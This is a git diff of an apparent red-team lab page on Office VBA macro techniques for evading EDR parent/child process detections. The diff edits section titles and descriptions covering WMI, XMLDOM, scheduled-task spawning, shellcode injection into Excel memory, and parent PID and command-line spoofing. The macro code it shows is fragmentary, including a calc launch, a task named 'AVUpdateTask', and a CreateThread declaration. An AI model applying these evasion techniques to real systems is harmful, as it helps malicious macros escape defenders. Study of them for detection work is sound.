@@ -2,9 +2,11 @@
 
 Defenders often will look engineer detections based on parent/child process relationships - i.e Excel spawns powershel - suspicious.
 
-Below are some techniques showing how those type of detections could be bypassed.
+This lab is mostly based on the techniques discussed on [https://www.countercept.com/blog/dechaining-macros-and-evading-edr/](https://www.countercept.com/blog/dechaining-macros-and-evading-edr/)
 
-## Spawning via WmiPrvse.exe
+Below are some techniques showing how those type of detections could be bypassed. 
+
+## Spawning via WmiPrvse.exe using wmi
 
 {% code-tabs %}
 {% code-tabs-item title="macro.vba" %}
@@ -31,7 +33,7 @@ obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-## Spawning via XMLDOM
+## Spawning via svchost.exe using XMLDOM
 
 {% code-tabs %}
 {% code-tabs-item title="xmldom.vba" %}
@@ -61,7 +63,9 @@ version="1.0">
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-## Spawning via Scheduled Task
+![](../../.gitbook/assets/screenshot-from-2019-04-10-23-04-07.png)
+
+## Spawning via svchost.exe using Scheduled Task
 
 {% code-tabs %}
 {% code-tabs-item title="macro.vba" %}
@@ -88,7 +92,7 @@ Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-10-22-19-03.png)
 
-## Shellcode injection to Memory
+## Shellcode Injection to Excel.exe Memory Using Windows APIs
 
 ```csharp
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr
@@ -130,7 +134,7 @@ End Sub
 
 ## Parent Process ID Spoofing
 
-With this technique it is possible to specify the PID under which our process will be launched:
+With this technique it is possible to specify the PID under which our process will be launched as well as process commandline arguments can be spoofed. Note that this is the same technique Cobalt Strike uses under the hood in its `argue` module:
 
 ```csharp
 ' code from https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/
